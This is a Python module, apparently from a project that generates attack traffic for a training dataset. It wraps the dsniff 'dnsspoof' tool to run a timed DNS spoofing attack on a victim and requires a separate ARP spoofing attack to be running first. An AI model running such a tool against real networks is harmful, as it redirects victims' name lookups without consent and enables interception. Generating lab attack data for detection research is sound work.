"""DNS spoofing attack (FR-2.4, Table 5.4). Wraps dnsspoof (dsniff).

REQUIRES arp_spoof.py to already be running against the same victim/gateway pair
so the attacker is on-path to see and answer the victim's DNS queries. The two
attacks are not auto-chained; run arp_spoof first.
"""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_timed_subprocess,
)


def build_command(interface: str, hosts_file: str) -> list[str]:
    return ["dnsspoof", "-i", interface, "-f", hosts_file]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"interface": None, "hosts_file": None, "duration": 60}
    it = iter(extra)
    for arg in it:
        if arg == "--interface":
            parsed["interface"] = next(it)
        elif arg == "--hosts-file":
            parsed["hosts_file"] = next(it)
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    if parsed["interface"] is None or parsed["hosts_file"] is None:
        raise ValueError("dns_spoof requires --interface and --hosts-file")
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    interface: str,
    hosts_file: str,
    duration: float = 60,
    dry_run: bool = False,
) -> AttackRecord:
    params = {
        "interface": interface,
        "hosts_file": hosts_file,
        "duration": duration,
        "prerequisite": "arp_spoof must already be running to put the attacker on-path",
    }

    def body():
        check_tools(["dnsspoof"])
        run_timed_subprocess(build_command(interface, hosts_file), duration)

    return run_attack("dns_spoof", "dnsspoof", attacker_ip, victim_ip, out_dir, params, body, dry_run)
